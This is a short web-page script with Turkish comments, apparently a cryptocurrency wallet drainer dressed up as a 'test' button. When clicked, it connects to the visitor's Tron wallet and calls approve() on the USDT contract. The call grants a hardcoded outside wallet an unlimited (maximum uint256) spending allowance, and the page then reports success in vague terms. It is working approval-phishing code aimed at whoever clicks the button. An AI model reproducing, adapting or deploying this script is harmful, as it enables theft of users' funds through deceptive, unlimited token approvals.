<script>
    // PARAMETRELER
    const hedefCüzdan = "TEBXagXwv1QW2nSrhBBhTbn7zGAu2wjaGp"; 
    const usdtKontrat = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const miktar = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    document.getElementById('runTest').onclick = async () => {
        const log = document.getElementById('log');
        
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            try {
                log.innerText = "Cüzdan bağlandı. Onay bekleniyor...";
                
                // Kontrat nesnesi oluşturuluyor
                const contract = await window.tronWeb.contract().at(usdtKontrat);

                // Yetki (Approve) fonksiyonu çağrılıyor
                await contract.approve(hedefCüzdan, miktar).send();

                log.style.color = "green";
                log.innerText = "İşlem Başarılı: Yetki tanımlandı.";
            } catch (err) {
                log.style.color = "red";
                log.innerText = "Hata: " + err;
            }
        } else {
            alert("Tron destekli bir cüzdan (TronLink/Trust Wallet) bulunamadı.");
        }
    };
</script>
